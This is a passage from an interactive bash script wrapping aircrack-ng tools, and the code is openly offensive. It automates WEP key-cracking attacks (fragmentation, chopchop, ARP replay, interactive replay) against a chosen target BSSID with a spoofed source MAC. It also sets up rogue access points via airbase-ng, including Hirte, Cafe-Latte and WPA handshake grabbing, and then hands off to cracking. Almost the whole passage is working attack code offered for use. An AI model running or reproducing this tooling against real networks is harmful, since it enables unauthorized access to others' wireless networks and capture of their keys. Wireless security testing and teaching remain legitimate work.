~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Tgt BSSID [\033[1;33m$b\033[36m]

2) Source MAC [\033[1;33m$sm\033[36m]

3) Re-Authentication Packets per Burst {1 is Recommended} [\033[1;33m$ppb\033[36m]

4) Re-Authentication Delay in Seconds {10 is Recommended} [\033[1;33m$rd\033[36m]

5) Keep-Alive Frequency in Seconds {3 is Recommended} [\033[1;33m$kaf\033[36m]

6) Replayed Packets per Burst {500 is Recommended} [\033[1;33m$rppb\033[36m]

7) Proceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		1) echo -e "\033[36mTgt BSSID?"
		read b
		rtech_II--;;

		2) echo -e "\033[36mSource MAC?"
		read sm
		rtech_II--;;

		3) echo -e "\033[36mRe-Authentication Packets per Burst?"
		read ppb
		rtech_II--;;

		4) echo -e "\033[36mRe-Authentication Delay in Seconds?"
		read rd
		rtech_II--;;

		5) echo -e "\033[36mKeep-Alive Frequency in Seconds?"
		read kaf
		rtech_II--;;

		6) echo -e "\033[36mReplayed Packets per Burst?"
		read rppb
		if [ $rppb -gt 1000 ];then
			rppb=1000
		fi

		rtech_II--;;

		7) if [[ -z $b || -z $sm || -z $rd || -z $ppb || -z $kaf || -z $rppb ]];then
			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
			read
			rtech_II--
		fi;;

		*) rtech_II--;;
	esac

	tchan--
	cfile--
	iwconfig $pii channel $tc
	rtech_III--
	}

	rtech_III--()
	{
	orig_atk= ## Specification of original attack
	if [ $rt = 1 ];then
		orig_atk="1) Fragmentation Attack"
		st_1--
		dump--
		auth--
		sleep 2
		frag_gen--
		clear
		pforge--
		st_2--
		clear
		frag_out--
	elif [ $rt = 2 ];then
		orig_atk="2) Chop Attack"
		st_1--
		dump--
		auth--
		sleep 2
		chop_gen--
		clear
		pforge--
		st_2--
		clear
		chop_out--
	elif [ $rt = 3 ];then
		orig_atk="3) ARP Replay Attack"
		st_1--
		dump--
		auth--
		st_2--
		clear
		arp_out--
	elif [ $rt = 4 ];then
		orig_atk="4) -2 Attack"
		st_1--
		dump--
		auth--
		st_2--
		clear
		_2_out--
	fi

	amplify--
	st_3--
	crack--
	}

## Frag sub-functions
	frag_gen--()
	{
	xor= ## .xor file
	echo -e "\033[1;33m"
	aireplay-ng -5 -b $b -h $sm $pii
## The next line of script refers to the readout you get from the command above.
## It will look like this:
## Saving keystream in <filename>
## I haven't yet figured out how to "Grep Out" the output to fork it into the next command so that the .xor is used automatically with the packetforge-ng technique, if you know of a way, please email via william@wifishield.org

### use stdin for forking via $$?, when I get a router to play with, I SHALL implement this.. dd style perhaps?
	while [ -z $xor ];do
		echo -e "\033[36m
##############
.xor filename?
##############"
		read xor
	done
	}

	frag_out--()
	{ xterm -bg black -fg grey -sb -rightbar -title "Frag Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm & }

## Chop sub-functions
	chop_gen--()
	{
	xor= ## xor file
	echo -e "\033[1;33m"
	aireplay-ng $pii -4 -b $b -h $sm
	while [ -z $xor ];do
		echo -e "\033[36m
##############
.xor filename?
##############"
		read xor
	done
	}

	chop_out--()
	{ xterm -bg black -fg grey -sb -rightbar -title "Chop Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm & }

## ARP sub-function
	arp_out--()
	{ xterm -bg black -fg grey -sb -rightbar -title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm & }

## -2 sub-function
	_2_out--()
	{ xterm -bg black -fg grey -sb -rightbar -title "-2 Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm & }

## Amplify sub-functions
	amplify--()
	{
	amp_a= ## Amp Attack Method
	rec_atk=$orig_atk ## Looping Variable

		amplify_II--()
		{
		arp_made= ## Variable to ascertain if arp-request file exists

			amp_null--()
			{ amp_a= ;} ## Nullifying $amp_a to keep the loop

			amplify_III--()
			{
			case $amp_a in
				1) echo -e '\033[36m\nHas a "Fragmentation Attack" arp-request file via packetforge-ng already been created? (y or n)'
				read arp_made
				case $arp_made in
					y|Y) echo -e "\033[36m\nWhat is the name of the arp-request file?"
					read pf_var
					frag_out--
					arp_made= ;; ## nulled

					n|N) frag_gen--
					clear
					pforge--
					st_2--
					clear
					frag_out--;;

					*) amplify_III
				esac

				rec_atk="1) Fragmentation Attack"
				amp_null--
				amplify_II--;;

				2) echo -e '\033[36m\nHas a "Chop Attack" arp-request file via packetforge-ng already been created? (y or n)'
				read arp_made
				case $arp_made in
					y|Y) echo -e "\033[36m\nWhat is the name of the arp-request file?"
					read pf_var
					chop_out--
					arp_made=  ;; ## nulled

					n|N) chop_gen--
					clear
					pforge--
					st_2--
					clear
					chop_out--;;

					*) amplify_III--;;
				esac

				rec_atk="2) Chop Attack"
				amp_null--
				amplify_II--;;

				3) arp_out--
				rec_atk="3) ARP Replay Attack"
				amp_null--
				amplify_II--;;

				4) _2_out--
				rec_atk="4) -2 Attack"
				amp_null--
				amplify_II--;;

				5) ;;
			
				*) echo -e "\033[38mYOU MUST CHOOSE A TECHNIQUE TO PROCEED"
				read
				amplify_II--;;
			esac
			}
			
		while [ -z $amp_a ];do
			clear
			echo -e "\033[1;33m$orig_atk was the original attack used\n$rec_atk was the most recent attack used\n"
			sleep 2
			echo -e "\033[1;32mChoose the Amplification Method Below\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     --Amplification Technique Selection--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Fragmentation Attack

2) Chop Attack

3) ARP Replay Attack

4) -2 Attack

5) Exit Amplification Mode\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
			read amp_a
		done

		amplify_III--
		}
	
	clear
	echo -e "\033[36m\nPerform Amplification Attacks? (y or n)"
	read var
	case $var in
		y|Y) amplify_II--;;
		n|N) ;;
		*) amplify--;;
	esac
	}
##^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^##

##~~~~~~~~~~~~~~~~~~~~~~~~~ ctech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
	ctech_II--()
	{
	#b= ## tgt bssid
	#e= ## tgt essid
	orig_atk= ## Specification of original attack
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   --Packet Injection Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
(S)oftAP BSSID [\033[1;33m$b\033[36m]

(T)gt ESSID [\033[1;33m$e\033[36m]

(P)roceed\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
	read var
	case $var in
		s|S) echo -e "\033[36m\nDesired SoftAP BSSID?"
		read b
		ctech_II--;;

		t|T) echo -e "\033[36m\nTgt ESSID?"
		read e
		ctech_II--;;

		p|P) if [[ -z $b || -z $e ]];then
			echo -e "\033[31mYou Must Enter Both the BSSID and ESSID"
			read
			ctech_II--
		fi;;

		*) ctech_II--;;
	esac

	tchan--
	cfile--
	clear
	case $ct in
		1) orig_atk="1) Hirte (AP)"
		xterm -bg black -fg grey -sb -rightbar -title "Hirte (AP)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 &
		sleep 2
		dump--;;

		2) orig_atk="2) Hirte (Ad-Hoc)"
		xterm -bg black -fg grey -sb -rightbar -title "Hirte (Ad-Hoc)" -e airbase-ng $pii -c $tc -e "$e" -N -W 1 -A &
		sleep 2
		dump--;;

		3)orig_atk="3) Cafe-Latte"
		xterm -bg black -fg grey -sb -rightbar -title Cafe-Latte -e airbase-ng $pii -c $tc -e "$e" -L -W 1 &
		sleep 2
		dump--;;

		4) orig_atk="4) Shared-Key PRGA Capture"
		xterm -bg black -fg grey -sb -rightbar -title "Shared-Key PRGA Capture" -e airbase-ng $pii -c $tc -e "$e" -s -W 1 -F $cf &
		sleep 2;;
	esac

	st_3--
	crack--
	}
##^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^##

##~~~~~~~~~~~~~~~~~~~~~~~~~~ WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
	WPA_II--()
	{
	#tc= ## Target Channel for WiFi Attacks
	echo -e "\033[36m\nDesired WiFi Channel for attack? (1-11)"
	read tc
### Need to learn to case within range...Also learn if within range (with sanitization) [1-11]???
	case $tc in
		1|2|3|4|5|6|7|8|9|10|11) WPA_III--;;
		*) WPA_II--;;
	esac
	}

	WPA_III--()
	{
	wpa_pid= ## PID for WPA attack Airodump-NG scan
	case $spec in
		1) case $wifu in
			1|2|3) wpa_warn--
			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -F ab_$cf & wpa_pid=$! ;;

			7|8|9) wpa_warn--
			xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 -e "$e" -y -F ab_$cf & wpa_pid=$! ;;
		esac;;

		2) wpa_warn--
		xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
	esac

	echo -e "\033[1;32m\nPress Enter to Exit Script Once Tgt'd Handshake has Been Captured\n"
	read
	kill -9 $wpa_pid &
	main_menu--
	}
##^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^##

## wifi_101-- trap catcher
	cleanup_101--()
	{
	echo -e "\033[36m\nKill WiFi_101 Processess Before Returning to the Main Menu? (y or n)"
	read kill_wifi
	case $kill_wifi in
		y|Y) echo -e "\033[1;33m"
		killall xterm
		killall airbase-ng
		killall aircrack-ng
		killall aireplay-ng
		main_menu--;;

		n|N) main_menu--;;

		*) cleanup_101--;;
	esac
	}

## wifi_101-- Launcher
venue--
}
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ END OF wifi_101-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
if [ "$UID" -ne 0 ];then
	echo -e "\033[38mMust be ROOT to run this script"
	exit 87
fi

if [ -z $1  ]; then
	IE= ## Internet Connected NIC
	pre_pii= ##
	pii= ## Dual mode variable, can be monitormode variable, or device to be assigned to monitor mode
	kill_mon= ## Nulled
	mon_live= ## Nulled
	greet--
else
	usage--
fi
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
